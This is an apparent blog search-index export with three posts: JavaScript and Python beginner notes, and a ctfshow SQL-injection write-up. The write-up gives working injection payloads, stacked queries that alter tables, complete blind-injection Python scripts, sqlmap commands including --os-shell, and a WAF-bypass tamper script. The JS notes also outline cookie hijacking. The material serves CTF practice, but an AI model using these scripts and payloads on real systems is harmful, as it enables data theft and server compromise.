[{"title":"JavaScript快速入门","url":"/2023/06/30/JavaScript/","content":"JavaScript1.快速入门1.1 引入\n内部标签 &lt; script &gt;&lt; &#x2F;script &gt;\n外部引入 &lt; script src&#x3D;”study.js” &gt;&lt; &#x2F;script &gt;\n\n1.2 基本语法和其他高级语言基本一样，var定义变量，console.log(变量名)输出到控制台。\nF12控制台常用\nelements爬网站 \nconsole 调试js代码  \nsource 打断点 \nnetwork 抓包 \napplication 获取cookie\n1.3 数据类型\n变量 var，所有变量都用var\n\n数字 number NaN not a number Infinity无限大\n\n字符串\n\n布尔值\n\n逻辑运算\n\n比较运算符，两个等号表示只需值一样，三个等号表示值和类型必须一样。\n\nnull 空，undef未定义\n\n数组：js的数组不一定是相同类型的对象\nvar arr = [1,2,3,4,5,&#x27;hello&#x27;,null,true];//第二种定义方法new Array(1,2,3,4,5,&#x27;hello&#x27;);\n\n对象：对象是大括号，数组是中括号 \nvar person = &#123;\tname:&#x27;Tom&#x27;,\tage:3,\ttags:[&#x27;js&#x27;,&#x27;java&#x27;,&#x27;web&#x27;,&#x27;...&#x27;]&#125;\n\n取对象值 person.name  - &gt; “Tom”.\n\n\n2.数据类型详解2.1 字符串\n单引号或双引号包裹\n转义字符 \\\n多行字符串编写，使用 &#96;&#96; 包裹\n模板字符串\n\nlet name = &#x27;Tom&#x27;;var msg = `你好，$&#123;name&#125;`\n\n\n字符串长度 str.length\n字符串是常量，不可变，可以通过下标访问每一个字母\n大小写转换 toUpperCase()这是方法不是属性\n定位字母，indexOf()\nsubstring(start,end)\n\n2.2 数组\n长度和length和indexOf和string一样\nslice()切出数组的一部分\npush()，pop()尾插和尾删，尾删弹出了元素\nunshift压入头，shift头弹出一个元素\nsort(),reverse()排序，翻转，concat拼接数组，返回一个新的，其实并没有改变原数组。 \njoin 打印拼接字符，使用特定的字符串连接\n\n2.3 对象var 对象名 = &#123;\t属性名：属性值，\t属性名：属性值，\t属性名：属性值&#125;\n\n对象由若干个键值对组成，所有键都是字符串，值是任意对象\n使用不存在的对象不会报错，会返回undefined\ndelete删除对象属性\n直接给新属性添加值实现动态添加\n判断属性是否在这个对象中  xxx in 对象名\n判断属性是否是对象自身拥有的  hasOwnProperty()\n2.4 流程控制while if等和其他高级语言一样。\nforEach循环   .forEach(函数)\nfor … in …循环\n2.5 Map和SetES6的新特性，和c++的map和set类似，起到去重的效果\nMap  get获得值，set新增或修改(键，值)\nSet  add加，delete删，has（）看有没有\n只能用new来创建这两个\n3.函数3.1 定义函数function 函数名{}\narguments，所有传递进来的参数形成的一个数组。\nrest获取除了已定义的参数之外的所有参数a,b,…rest必须使用…\n3.2 作用域和c++完全一样。建议使用let去定义局部作用域的变量。\n4.内部对象4.1 Data用来获取时间 有getFullyear之类的方法\n4.2 Jsonjson是一种轻量级的数据交换格式，json的格式，对象都用{}，数组都用[]，所有的键值对都是用key:value\njson字符串和js对象的转化\n使用JSON.stringify(对象)可以将对象转化为json字符串，相当于把对象进行了扁平化，使他变成了一个json字符串，不再可以展开。\n使用JSON.parse(‘Json字符串’)可以把json字符串转化为js对象。\n5.操作BOM对象\nwindow 控制浏览器窗口\n\nnavigator 封装了浏览器的信息，但是可以人为改\n\nlocation 查看当前页面的URL信息，location.assign可以实现网页的跳转，reload可以刷新网页\n\ndocument代表了当前的页面，html dom文档树\n可以具体获取文档树的节点，也可以用.cookie直接获取cookie，劫持cookie原理，获取用户的cookie并上传到自己的服务器。\n\nhistory代表浏览器的历史记录 history.back(),.forward()可以控制网页的前进和后退。\n\n\n6.操作DOM对象浏览器网页就是一个DOM树形结构\n\n更新：更新dom节点\n遍历：得到dom节点\n删除：删除一个dom节点\n添加：添加一个新节点\n\n要操作一个dom节点，就必须先获得这个dom节点\n\n增加节点：创建一个新的&lt;p&gt;元素，并将其添加到&lt;div id=&quot;container&quot;&gt;中。\n\n// 创建一个新的&lt;p&gt;元素var p = document.createElement(&quot;p&quot;);// 设置元素的文本内容p.innerHTML = &quot;这是一个新的段落&quot;;// 获取&lt;div id=&quot;container&quot;&gt;元素var container = document.getElementById(&quot;container&quot;);// 将&lt;p&gt;元素添加到&lt;div&gt;元素中container.appendChild(p);\n\n\n删除节点：删除&lt;div id=&quot;container&quot;&gt;中的第一个子节点。\n\n// 获取&lt;div id=&quot;container&quot;&gt;元素var container = document.getElementById(&quot;container&quot;);// 获取&lt;div&gt;元素的第一个子节点var firstChild = container.firstChild;// 删除第一个子节点container.removeChild(firstChild);\n\n\n修改节点：修改&lt;div id=&quot;container&quot;&gt;中的第一个子节点的样式和文本内容。\n\n// 获取&lt;div id=&quot;container&quot;&gt;元素var container = document.getElementById(&quot;container&quot;);// 获取&lt;div&gt;元素的第一个子节点var firstChild = container.firstChild;// 修改子节点的样式属性，设置字体颜色为红色firstChild.style.color = &quot;red&quot;;// 修改子节点的文本内容，添加感叹号firstChild.innerHTML += &quot;!&quot;;\n\n\n查询节点：查询所有有class=&quot;item&quot;属性的元素，并打印它们的文本内容。\n\n// 查询所有有class=&quot;item&quot;属性的元素，返回一个数组var items = document.getElementsByClassName(&quot;item&quot;);// 遍历数组中的每个元素，打印它们的文本内容for (var i = 0; i &lt; items.length; i++) &#123;  console.log(items[i].innerHTML);&#125;\n\n7.操作表单（验证）\n文本框 input &#x3D; text\n\n下拉框&lt; select &gt;\n\n单选框 radio\n\n多选框 checkbox\n\n隐藏域 hidden\n\n密码框 password\n\n获得表单的值：可以使用document.forms或者document.getElementById()等方法来获取表单元素，然后使用value属性来获取表单元素的值。例如，如果有一个表单元素&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;，可以用以下代码来获取它的值：\n\n\n// 获取表单元素var nameInput = document.getElementById(&quot;name&quot;);// 获取表单元素的值var nameValue = nameInput.value;\n\n\n设置表单的值：可以使用document.forms或者document.getElementById()等方法来获取表单元素，然后使用value属性来设置表单元素的新值。例如，如果想要将上面的表单元素的值设置为”Tom”，可以用以下代码来实现：\n\n// 获取表单元素var nameInput = document.getElementById(&quot;name&quot;);// 设置表单元素的新值nameInput.value = &quot;Tom&quot;;\n\n\n（表单提交验证）通过向form标签中添加onsubmit事件实现表单提交：可以在form标签中添加一个onsubmit属性，指定一个js函数来验证表单数据是否合法，如果合法则返回true，否则返回false。例如，如果有一个表单元素&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;，可以用以下代码来验证它是否为空：\n\n&lt;form onsubmit=&quot;return validateForm()&quot;&gt;  &lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;  &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;script&gt;  function validateForm() &#123;    // 获取表单元素    var nameInput = document.getElementById(&quot;name&quot;);    // 获取表单元素的值    var nameValue = nameInput.value;    // 判断表单元素的值是否为空    if (nameValue == &quot;&quot;) &#123;      // 弹出提示信息      alert(&quot;请输入姓名&quot;);      // 阻止表单提交      return false;    &#125;    // 允许表单提交    return true;  &#125;&lt;/script&gt;\n\n\n通过向按钮中添加onclick事件触发js函数以提交表单：可以在按钮元素中添加一个onclick属性，指定一个js函数来验证表单数据是否合法，如果合法则调用form.submit()方法来提交表单，否则不做任何操作。例如，如果有一个表单元素&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;，可以用以下代码来验证它是否为空：\n\n&lt;form id=&quot;myForm&quot;&gt;  &lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;  &lt;button onclick=&quot;validateForm()&quot;&gt;提交&lt;/button&gt;&lt;/form&gt;&lt;script&gt;  function validateForm() &#123;    // 获取表单元素    var nameInput = document.getElementById(&quot;name&quot;);    // 获取表单元素的值    var nameValue = nameInput.value;    // 判断表单元素的值是否为空    if (nameValue == &quot;&quot;) &#123;      // 弹出提示信息      alert(&quot;请输入姓名&quot;);      // 不做任何操作      return;    &#125;    // 获取form元素    var form = document.getElementById(&quot;myForm&quot;);    // 提交form元素    form.submit();  &#125;&lt;/script&gt;","categories":["Acknowledge"],"tags":["JS"]},{"title":"Python基础","url":"/2023/06/30/Python%E5%9F%BA%E7%A1%80/","content":"Python全栈系列教程_孤寒者的博客-CSDN博客\npycharm快捷键：已设置成visual stdio模式\n在解释器选项中添加参数 -Xfrozen_modules=off\n运行设置处勾选在输出控制台模拟终端\n1. Python基础语法1. 零散小知识点1.1 Python标识符python3可以使用中文作为变量名\n特殊意义的标识符：\n\n以单下划线开头_foo的代表不能直接访问的类属性，须通过接口访问。\n以双下划线开头__foo代表类的私有成员\n以双下划线开头和结尾的__ foo __代表python里的特殊方法\n\npython同一行写多条语句需要加分号，换行不用加\n1.2 行和缩进python代码块不使用大括号来控制类，函数和其他逻辑判断，而是使用缩进对齐来写模块\n相同的块内代码语句缩进必须相同\n一行很长的语句可以用\\来换行，而括在括号里的语句不需要\\就能换行。\n1.3 input，printinput()接收输入信息，也可以使用eval(input(表达式) )直接接收python表达式，返回运算结果。input(要输出的，end&#x3D;)自定义尾\nprint()输出信息，“，”隔开变量，注意逗号后面有空格\n1.4 变量赋值与删除python是动态语言，可以将任意数据类型数据赋给一个变量，python变量赋值不需要类型声明，但是在使用这个变量前必须要赋值，python的变量相当于只是给值贴了个标签\ndel可以删除对象引用，也就是撕掉这个标签\n1.5 pycharm提示信息语法错误：代码底部红色波浪线\n语法不符合规范：底部灰色波浪线\n单词拼写提示：底部绿色波浪线\n2. python常用标准库2.1 文件通配符glob模块，glob.glob(‘*py’)，从当前目录查找含py的文件 \n2.2 访问互联网requests库，urllib库\n3. python七大运算符\n算术运算符，&#x2F;除，返回精确值，&#x2F;&#x2F;地板除，返回商\n\n比较运算符，字符串用ascii码比\n\n赋值运算符，和c一样\n\n位运算符，和c一样\n\n逻辑运算符，not and or\n\n成员运算符，in和not in，在序列中查找值，找到了返回true，找不到返回false\n\n身份运算符，is和not is用于比较两个对象的存储单元是否引用自同一个对象，通过判断内存地址是否相等来判断\n\n\n4. 控制语句记住控制语句条件后都要加：\n4.1 if语句if 条件： elif 条件： else：\n三元表达式 表达式1 if 条件 else 表达式2 \n4.2 循环语句while（）：for num in ：  else： for后面的else在循环结束后进行，如果for被break了就不执行else\n5. 数据类型的转换python数据类型有int，float，str，list，tuple，dict，set\nint(x,base &#x3D; ),base指定转化成多少进制\nfloat(x) 转浮点\ncomplex(real,image) 形成虚数\nchr(x) 转字符\nstr(x) 转字符串  list()和tuple()实现tuple和list的相互转换\npython不支持char 和 byte，只能用长度为1的字符串存储\nisinstance判断一个变量是否是该类型，而type返回变量的类型\n2. Python数据类型掌握常用的函数即可，不常用的用到了可以马上查\n注意，区间都是左闭右开\n1. Number数字abs()绝对值,import math  fabs()浮点绝对值,floor()向下取整,ceil()向上取整\n随机数函数   import random：random.choice（range()）从序列中随机挑一个元素   \nrandrange(start,stop,step) 生成指定开始和终止以及步长的随机值  \nshuffle(list) 打乱序列中的所有元素\n数据类型：数值 int float bool complex\n序列 str tuple list\n散列 set dict\n2. String字符串字符串名[start,end]可以截取字符串\n\n字符串运算符  %s 和c一样进行格式化输出\n\n字符串格式化  str.format()\n\n\nprint(&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;))  # 不设置指定位置，按默认顺序print(&quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;))  # 设置指定位置print(&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;))  # 设置指定位置# 设置参数print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(name=&quot;百度&quot;, url=&quot;www.baidu.com&quot;))# 通过字典设置参数site = &#123;&quot;name&quot;: &quot;百度&quot;, &quot;url&quot;: &quot;www.baidu.com&quot;&#125;print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(**site))# 通过列表索引设置参数my_list = [&#x27;百度&#x27;, &#x27;www.baidu.com&#x27;]print(&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;.format(my_list))  # &quot;0&quot; 是后面只有一个列表，所以选定第一个。可以多个列表，各个列表中选相应的值\n\nstr.format()格式化数字{:.2f}输出后面的那个数时保留两位小数\n使用input得到的信息都是string，要记得进行转换\n3. List列表\nList（列表） 是 Python 中使用最频繁的数据类型。列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（所谓嵌套）。列表用[ ]标识。是python最通用的复合数据类型。列表中的值得分割也可以用到变量[头下标:尾下标]，就可以截取相应的列表，从左到右索引从0开始的（跟字符串一样）。加号（+）是列表连接运算符，星号（*）是重复操作。\n\n基本概念：在Python程序中使用中括号”[]”来表示列表，并用逗号分隔其中的元素。\n\n查：通过下标索引取值，也可以通过下标切片，-1可以取到最后一个值，切片左闭右开：步长，步长为负数则逆向切\nL[m:n:p]表示：从索引m开始直到索引n(不包含n)取数据，每p个取一个。\nlist.index(x,y) 第一个参数是要查找的值，第二个参数是从哪个下标开始查找，默认是从0开始。\n\n增：\n\nlist.append(obj) \nlist.insert(x,y) 在自定义位置x 添加元素y，插入到指定索引\nlist.extend(sep) 在列表末尾一次性追加另一个序列\n\n\n删：\n\nlist.pop() 无参删最后一个，有参删对应下标的\nlist.remove(x) 删除指定元素，有多个重复时只删第一个\nlist.clear() 清空列表，删除列表中的所有值\n\n\n其他：\n\n分隔符.join()，将序列中的元素用分隔符连接，生成新的字符串。\nreverse() 反向列表中的元素\nlist.sort(func) 对原列表进行排序\n\n\n项目中常见链表小操作\n\n使用collections模块里的Counter类，然后调用most_common()函数来实现\n在python程序中，使用函数slice()可以实现切片对象，能够在切片操作函数中实现参数传递功能，可以被用在任何允许进行切片操作的地方。\n\n\n\n4. tuple元组元组可以看作一种特殊的列表，元组与列表唯一的不同在于：元组内的数据元素不能发生改变，也不能添加和删改数据项，当我们需要创建一组不可变的数据时，通常把他放入元组中。\n\n元组的创建：创建元组的基本形式是以小括号“（）”将元素括起来，各个元素用逗号“，”。\n任意无符号的对象，以逗号隔开，默认为元组\n\n元组的修改和删除\n修改：只能通过加号连接两个元组\n删除：元组不可变，但可以通过del语句直接删掉整个元组\n\n元组运算符\nlen计算元素个数，+连接，*复制，in存在，forin遍历\n\n元组内置方法\nlen，max，min，tuple（seq）将列表转换为元组\n其实更多时候我们是将元组转换为列表，操作完之后再转换为元组。注意tuple和list都是返回了一个新的，而不是直接改变了原来的。\n\n元组虽然不可变，但是他指向的可变元素是可变的，比如元组中有一个元素是列表，该列表可变。\n\n*运算符可以分解可迭代对象，常用于函数传不定个参数，形参写成 *arg，输入一个元组作为实参，然后就可以在函数中使用元组的成员。\n\n\n5.dict字典（hash）\n字典(dictionary)是键值对形式的可变容器，可存储任意类型对象。列表是有序的对象结合，字典是无序的对象集合。字典是python中唯一内建的映射类型。\n\n字典的每个键值(key&#x3D;&gt;value)对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中\n\n字典键的特性1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，前一个的值会被后一个覆盖2）值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。因为列表是可变的，所以键不能为列表\n\n声明存在的数据集合。字典与列表相比，最大的不同在于字典是无序的，其成员位置只是象征性的，在字典中我们需要通过键来访问成员，而不能通过其位置来访问成员。\n\n字典的创建\n\n使用dict()函数来创建字典\ndict1 = dict(a=&#x27;a&#x27;, b=&#x27;b&#x27;, t=&#x27;t&#x27;)     # 传入关键字dict2 = dict(zip([&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;], [1, 2, 3]))   # 映射函数方式来构造字典dict3 = dict([(&#x27;one&#x27;, 1), (&#x27;two&#x27;, 2), (&#x27;three&#x27;, 3)])    # 可迭代对象方式来构造字典\n\n第一种直接输入键值对，第二种使用zip函数将两个列表一一对应，第三种直接传入一一对应的列表。\n\n使用dict函数的fromkeys()方法来创建字典\n前面用一个列表表示键，后面传入一个值表示所有键的统一值\n\n\n\n字典的访问\n\n直接通过键去访问对应的值，若无该键则报错\n通过get方法来获取key对应的值，key不存在返回None\nkeys方法取出所有的key，values方法取出所有的value，items方法取出所有的键值对\nsetdefault方法有该key则查，无则增\n\n\n增\n直接给键赋值即可，如果键已经有值，则新的覆盖老的，还可以使用update方法更新字典，将原字典和新字典合并，新的覆盖老的。\n\n删\n使用del语句彻底地删掉一个字典中的键值对，还可以使用clear方法直接清空字典。pop方法也可以删掉字典里的键值对，popitem删掉最后一个键值对。del dict 删除一个字典。\n\n实现一键多值的字典\n使用collections模块里的defaultdict或者直接用setdefault\n\n获取字典中的最大值和最小值，zip调换key和value，sorted再排序\n\n获取两个字典中相同的键值对，通过keys或items获得所有的键或所有的值，再使用&amp;取交集。\n\n创建有序字典： 使用collections中的OrderedDict，先加入的元素放在最前面，使用popitem删除最后加入的元素并返回键值对。\n\n\n6.set集合\n集合（set）是一个无序的不重复元素序列。所以启发在做元素的去重操作时可用set()\n\n可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。\n\nadd加，discard删，remove删，update合并\n\n\n3. Python函数1. 函数基础使用def来定义函数，加：而不是花括号，return返回值，也可以返回一个元组，如果没想好函数怎么写，可以使用pass来占位。\npython里没有传值和传值的说法，只有传的是可变对象和不可变对象的说法，如果往函数中传入的是可变对象，那么函数就可以使得该对象发生改变，如果传入的是不可变的对象，则函数中改变时只是新建了一个副本进行改变，原来的值没有变化。\n可以使用lambda函数来创建一个匿名函数\n2. 函数参数\n参数的数量一定要一一对应，否则会报错\n函数参数的四种类型：\n必备参数：必须要传入，没有默认值\n关键字参数：允许传入0个或任意个含参数名的参数（传键值对），这些关键字参数在函数内部自动组装成一个dict，**kw\n默认参数：不传入时使用默认值\n不定长参数：*arg，接收一个元组或者列表，不定长参数只能声明一个且必须在最后声明。\n\n\n\n","categories":["Knowledge"],"tags":["Python"]},{"title":"ctfshow-sql注入篇","url":"/2023/06/30/ctfshow-sql%E6%B3%A8%E5%85%A5%E7%AF%87/","content":"select无过滤web171：最常规注入\nweb172：加了约束，判断回显的字段是否有flag，可以用to_base64(username)绕过，也可where\nweb173：同上\nselect有过滤web174：过滤了回显中的flag和数字0-9，两种方法绕过，一个方法是写脚本盲注，要注意用burpsuite抓包发现一个可以查询是否成功的api接口，对这个接口进行盲注爆破flag，另一个方法是将所有的数字替换成其他的字符，再逆操作解码即可。第二种方法的payload：\n-1’ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”) from ctfshow_user4 where username &#x3D; ‘flag’ –+\n用到了sql中的replace函数，python中也有相应的replace，逆操作如下\nflag64 = &quot;ctfshow&#123;@Hb@Ff@De@Hd-cb@E@C-@D@A@Hd-@Ib@J@A-b@A@Feed@Ea@H@E@B@J&#125;&quot;flag = flag64.replace(&quot;@A&quot;, &quot;1&quot;).replace(&quot;@B&quot;, &quot;2&quot;).replace(&quot;@C&quot;, &quot;3&quot;).replace(&quot;@D&quot;, &quot;4&quot;).replace(&quot;@E&quot;, &quot;5&quot;).replace(   &quot;@F&quot;, &quot;6&quot;).replace(&quot;@G&quot;, &quot;7&quot;).replace(&quot;@H&quot;, &quot;8&quot;).replace(&quot;@I&quot;, &quot;9&quot;).replace(&quot;@J&quot;, &quot;0&quot;)print(flag)\n\nweb175：用正则表达式过滤掉了所有字符，只能使用盲注\n由于查看api接口发现不管输入什么都是返回错误，只能使用时间盲注\nimport requestsurl = &quot;http://3f1538ed-4694-4f48-8879-3f4eff06167d.challenge.ctf.show/api/v5.php&quot;flag = &quot;&quot;i = 0while True:   i = i+1   left = 32   right = 127   while left &lt; right:      mid = (left+right) // 2      payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&quot;      try:         res = requests.get(url = url+payload,timeout=0.6)         right = mid      except Exception as e:         left = mid+1   if left != 32:      flag+=chr(left)      print(flag)   else:      break\n\n一个标准的时间盲注模板，不需要引入系统时间，直接在timeout内看是否能登上网页，使用二分查找法来加速，不同的题只需要改payload和url即可\nweb176：过滤了union，select等，使用大小写混搭绕过\nweb177：176基础上过滤了空格，空格被过滤可以用，&#x2F;**&#x2F;，%09，%0a，%0b，%0c，%0d还有括号绕过，注意不能用%20，因为空格也会被解析成%20，其实根本没有绕过。\nweb178：177基础上过滤了&#x2F;**&#x2F;，依然可以用剩下的各种符号绕过\n根据查询语句绕过web181：运算符优先级绕过 payload：-1’||username&#x3D;’flag ，利用原查询中的and比后面我们自己加进来的or优先级高来绕过，前面的先进行判断，结果为错，因为没有id&#x3D;-1的列，执行后面的username&#x3D;’flag查询，得到flag\nweb187: md5(string,true)绕过\n$password &#x3D; md5($_POST[‘password’],true);\npassword&#x3D;ffifdyop或者是129581926211651571912466741651878684928可以登录成功\nweb188：mysql弱类型比较绕过\n在mysql中字符串与数字比较时，以字母为开头的字符串都会转化成0\n因此where username&#x3D;0这个查询语句可以把所有username以字母开头的数据查出来\nif($row[‘pass’]&#x3D;&#x3D;intval($password)){这个pass也是以字母开头的，传入0可绕过。\n注意：如果有不是以字母开头的数据就会匹配不成功，这是可以用username&#x3D;1||1来匹配，由于或的特性，这样一定会匹配成功。\n布尔盲注web189：load_file+盲注\n题目提示flag在&#x2F;api&#x2F;index.php中，尝试用select读取发现select被屏蔽，只能使用盲注，根据上一题，尝试输入账号密码为0，提示密码错误，而把账号改成1提示查询失败，利用这个&#x2F;api&#x2F;index.php不同的返回值来做盲注\npayload = &quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;),1,0)&quot;dic = &#123;\t\t\t&quot;username&quot;: payload.format(flag + j),\t\t\t# 1返回\\u67e5\\u8be2\\u5931\\u8d25\t\t\t&quot;password&quot;: &quot;0&quot;\t\t&#125;\n\n注意load_file读取一定要完整的路径，regexp用于正则匹配flag，在ctfshow{后面依次尝试添加不同的字母，若返回查询失败说明if语句返回了1，将该字母加入到flag中\nweb190：经典无过滤布尔盲注，见bool脚本，使用二分法加速\nweb191：过滤了ascii，使用ord函数替代，功能和ascii完全一致\nweb192：过滤了ord，将payload改一下，改成（注意{}加单引号表示字符）\npayload=&quot;&#x27;or (substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1))&gt;&#x27;&#123;&#125;&#x27;#&quot;.format(i,chr(mid))\n\n将mid转化成char再进行比较，由于sql比较时会先将字符转化为大写再比较，故输出的都是大写，也可以使用枚举，不使用二分法。\nweb193：过滤了substr，可以使用left，right，mid等替换\n同时也可以使用之前189提到的正则表达式的方式来匹配flag，就不需要对flag进行截断操作，不过这样就无法使用二分来加速且需要提前知道flag的前缀。\nweb194：同上\n堆叠注入web195：从本题开始堆叠注入的学习（多条组合查询，或者使用如handler等多条语句的命令，或者通过增删改查直接操作数据库来绕过验证）\n只要权限够，就可以进行增删改查，堆叠注入不是很常用，因为很容易被限制，但姿势很多，要注意积累。\n本题采用了改的方法，将表中的pass即密码字段全部改为1，再使用0这个万能用户名可以登录获得flag。也可以使用十六进制的admin登录，为什么一定要使用十六进制呢，因为这个sql查询语句没有用引号把传入字符串包起来。\npayload：0;update`ctf_user`set`pass&#96;&#x3D;1过滤了空格可以用反引号包住列名和表名，在handler里也有所提及。update + set\nweb196：用户名不能太长，本题过滤的是se1ect并没有过滤select，使用0;select(1);前面的查询返回空，而1填入了row[0]中（row代表的是sql查询语句返回的数据，正因如此，返回逻辑中才需要用row[0]和密码比较），密码也填1即可登录。注意密码的比较逻辑\nweb197：过滤了select，但没有过滤show，可以使用0;show tables，则tables返回的结果ctfshow_user填入到了**row[0]**中，密码填ctfshow_user就可登录。\nweb198：和上一题同理，同时也可以使用另一种方法，将id和pass的列名互换，然后爆破admin的id，id匹配上了就能成功登录。alter + change\npayload = &#x27;0x61646d696e;alter table ctfshow_user change column `pass` `gylq` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `gylq` `id` varchar(255);&#x27;\n\nweb199-200：同理\nsqlmap练习(12条消息) sqlmap使用教程(超详细)_Redmaple925的博客-CSDN博客\nweb201：这一题提示需要使用–refer&#x3D;“ctf.show”绕过，同时使用–user-agent指定。\nstep1：sqlmap -u [``&quot;URL&quot;``] ``//测试是否存在注入step2：sqlmap -u [``&quot;URL&quot;``] -current-db ``//查询当前数据库step3：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] --tables ``//查询当前数据库中的所有表step4：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] -T [``&quot;表名&quot;``] --columns ``//查询指定库中指定表的所有列(字段)step5：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] -T [``&quot;表名&quot;``] -C [``&quot;列名&quot;``] --dump ``//打印出指定库中指定表指定列中的字段内容\n\n注意如果是get请求，要在url后面加上?id&#x3D;，表示id是get接收的参数\nweb202：使用–data&#x3D;“id&#x3D;1”来指定post请求，其他一样。\nweb203：使用–method&#x3D; 来指定其他请求，如本题中需要指定put请求，另外需要注意更改content-type为text&#x2F;plain,–method&#x3D;”PUT” –data&#x3D;”id&#x3D;1” –headers&#x3D;”Content-Type: text&#x2F;plain”\nweb204：在上一题的基础上加上了–cookie，使用bp抓包，把抓到的cookie填进去\nsqlmap -u “http://1f958108-6cb3-4246-a57e-cc16dcd0bd2a.challenge.ctf.show/api/index.php&quot; –data “id&#x3D;1” –method&#x3D;PUT –header&#x3D;”Content-Type:text&#x2F;plain” –cookie&#x3D;”PHPSESSID&#x3D;jg00d7vu29fi84ohkp3ksi74t8; ctfshow&#x3D;3f55bb1bfd3e87d8ffcea6d6d55ea6a0” –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_user\nweb205：通过bp抓包可以发现，在请求api之前，网页先请求了getToken鉴权页面，使用sqlmap的–safe-url来先访问这个安全页面，再访问进行sql测试的api页面，同时要注意–safe-freq设置成1，每次都要先访问鉴权页面\nsqlmap -u “http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/index.php&quot; –data “id&#x3D;1” –method&#x3D;PUT –safe-url&#x3D;”http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/getToken.php&quot; –safe-freq&#x3D;1 –header&#x3D;”Content-Type:text&#x2F;plain” –cookie&#x3D;”PHPSESSID&#x3D;di7ffs2tm2hhprosgds13ga9pj” –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_flax –dump\nweb206：同上\nweb207：tamper初体验，–tamper&#x3D;脚本名，来调用脚本，当调用多个脚本时，脚本之间用逗号隔开，调用的脚本放在sqlmap文件夹下的tamper文件夹中。可以自己写也可以用别人写好的。\n本题过滤了空格，直接使用别人写好的模块space2comment绕过即可成功注入。\nweb208：同上\nweb209：本题过滤了等号和空格和*号，需要绕过对等号和空格的过滤，而现成的脚本中没有这样的功能，需要我们自行写tamper，然后放进sqlmap的tamper文件夹\nfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies():   passdef tamper(payload, **kwargs):   return payload.replace(&quot;=&quot;,&quot; like &quot;).replace(&quot; &quot;,chr(0x09))\n\ntamper分三部分，优先级，适用情况，主要函数（接受的参数为payload和**kwargs。返回值为替换后的payload，要替换的就是payload，来完成想要的绕过。kwargs是修改http头里的内容函数）\nweb210：同上，自写tamper对waf的操作进行反操作或者绕过。\nweb211：同上，绕过加反操作，自写的脚本详见myTamper\nweb212：同上\nweb213：使用sqlmap的–os-shell来获取网站的shell\ngetshell条件：\n1.网站必须是root权限2.知道网站的绝对路径3.PHP关闭魔术引号，php主动转义功能关闭4.secure_file_priv&#x3D;值为空\ngetshell成功上传文件之后可以使用菜刀连接或者直接在终端输命令即可 ls &#x2F;\n时间盲注web214：啥提示都没有，返回index.php页面，web题遇到啥都没有的情况可以通过bp抓一下包看看有没有什么突破口。\n抓包发现网页通过post方法提交了一个ip和一个debug，debug设置为0，修改debug为1出现了查询语句，由于正误无任何回显，故采用基于时间的盲注，本题为标准时间盲注模板。\nimport requestsimport timeurl = &quot;http://52996c56-6c23-4abb-8c0b-545755d9cb91.challenge.ctf.show/api/&quot;chars = &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-=&#123;&#125;_,&#x27;result = &quot;&quot;for i in range(0, 666):\tleft = 32\tright = 127\twhile left &lt; right:\t\tmid = (left+right)//2\t\tpayload = &quot;if(ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1)&quot;\t\t# payload = &quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),0)&quot;\t\t# payload = &quot;if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),0)&quot;\t\tdata = &#123;\t\t\t&quot;ip&quot;: payload.format(i, mid),\t\t\t&quot;debug&quot;: &#x27;0&#x27;\t\t&#125;\t\ttry:\t\t\tr = requests.post(url, data=data, timeout=1)\t\t\tright = mid\t\texcept Exception as e:\t\t\tleft = mid + 1\tresult += 